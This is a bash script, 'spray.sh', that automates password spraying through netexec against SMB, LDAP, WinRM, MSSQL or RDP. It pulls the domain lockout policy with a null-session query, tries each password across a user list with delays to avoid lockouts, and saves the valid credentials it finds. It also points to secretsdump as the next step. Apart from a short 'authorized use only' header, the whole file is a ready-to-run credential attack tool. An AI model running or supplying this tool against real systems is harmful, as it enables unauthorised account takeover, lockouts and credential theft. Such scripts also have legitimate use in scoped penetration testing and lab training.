#!/usr/bin/env bash
#
# spray.sh - lockout-aware password spraying (netexec)
# -----------------------------------------------------------------------------
# Sprays ONE password across MANY users per round (the safe order) so you never
# burn multiple guesses against a single account in a window. Supports SMB,
# LDAP, WinRM, MSSQL and RDP. Reads the domain lockout threshold first and warns
# if your run could lock accounts.
#   1. (optional) Pull lockout policy via netexec --pass-pol.
#   2. For each password: try it against every user, with a delay between rounds.
#   3. Stop-at-first-success per user by default; valid creds saved to file.
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY: spraying locks accounts and is very noisy. Run only on a
# range / lab / scoped engagement. Mind the lockout policy.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./spray.sh -i <target/CIDR> -U <userlist> (-p <pass> | -P <passlist>) \
#              [-d domain] [-proto smb|ldap|winrm|mssql|rdp] [-w sec] [-c] [-o out]
#
# EXAMPLES:
#   ./spray.sh -i 10.10.10.10 -U users.txt -p 'Spring2026!' -d corp.local
#   ./spray.sh -i 10.10.10.0/24 -U users.txt -P seasons.txt -proto winrm -w 60
#
# FLAGS:
#   -w <sec>  delay between password rounds (default 30) - respects lockout windows
#   -c        continue after a hit (don't stop on first valid per user)
#
# DEPENDENCIES: netexec (nxc)
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
c_step(){ printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }
have(){ command -v "$1" >/dev/null 2>&1; }

TARGET="" ULIST="" PASS="" PLIST="" DOMAIN="" PROTO="smb" WAIT=30 CONT="" OUT=""
usage(){ sed -n '2,33p' "$0"; exit 1; }
while getopts "i:U:p:P:d:w:co:h-:" o; do case "$o" in
  i) TARGET=$OPTARG;; U) ULIST=$OPTARG;; p) PASS=$OPTARG;; P) PLIST=$OPTARG;;
  d) DOMAIN=$OPTARG;; w) WAIT=$OPTARG;; c) CONT=1;; o) OUT=$OPTARG;;
  -) case "$OPTARG" in proto) PROTO="${!OPTIND}"; OPTIND=$((OPTIND+1));; proto=*) PROTO="${OPTARG#*=}";; esac;;
  *) usage;;
esac; done
# allow -proto as a convenience (getopts can't natively); also accept env PROTO
[ -z "$TARGET" ] || [ -z "$ULIST" ] && { c_err "need -i and -U"; usage; }
[ -z "$PASS" ] && [ -z "$PLIST" ] && { c_err "need -p <pass> or -P <passlist>"; usage; }
NXC=""; for b in nxc netexec crackmapexec; do have "$b" && { NXC=$b; break; }; done
[ -z "$NXC" ] && { c_err "netexec not found"; exit 1; }

OUT=${OUT:-"./spray_$(date +%Y%m%d_%H%M%S)"}; mkdir -p "$OUT"; cd "$OUT"
VALID=valid_creds.txt
DOPT=(); [ -n "$DOMAIN" ] && DOPT=( -d "$DOMAIN" )

c_info "Target $TARGET | proto $PROTO | users $(wc -l < "$ULIST") | delay ${WAIT}s"
c_step "Lockout policy check"
$NXC smb "$TARGET" -u '' -p '' --pass-pol 2>&1 | grep -iE 'lockout|threshold|reset' | tee lockout.txt || c_warn "could not read policy (continuing)"
c_warn "Spraying can LOCK accounts. Keep one password per round; -w ${WAIT}s between rounds."

PASSES=(); if [ -n "$PLIST" ]; then mapfile -t PASSES < "$PLIST"; else PASSES=( "$PASS" ); fi
c_step "Spraying ${#PASSES[@]} password(s)"
for pw in "${PASSES[@]}"; do
  [ -z "$pw" ] && continue
  c_info "Round: password '$pw'"
  CONTFLAG=(); [ -n "$CONT" ] && CONTFLAG=( --continue-on-success )
  $NXC "$PROTO" "$TARGET" -u "$ULIST" -p "$pw" "${DOPT[@]}" "${CONTFLAG[@]}" 2>&1 \
    | tee -a spray_raw.txt | grep -iE '\[\+\]' | tee -a hits.txt || true
  # extract successful creds (netexec marks [+] domain\user:pass)
  grep -iE '\[\+\]' spray_raw.txt 2>/dev/null | sed -E 's/.*\[\+\] //' | sort -u > "$VALID" || true
  [ "${#PASSES[@]}" -gt 1 ] && { c_info "Sleeping ${WAIT}s (lockout window)..."; sleep "$WAIT"; }
done

c_step "DONE"
if [ -s "$VALID" ]; then
  c_ok "VALID credentials ($(wc -l < "$VALID")):"; sed 's/^/   /' "$VALID"
  c_info "Next: validate.sh to find where these give admin, then secretsdump.sh"
else
  c_warn "No valid credentials this run. Try more passwords (-P) or another proto."
fi
c_ok "Output: $(pwd)"
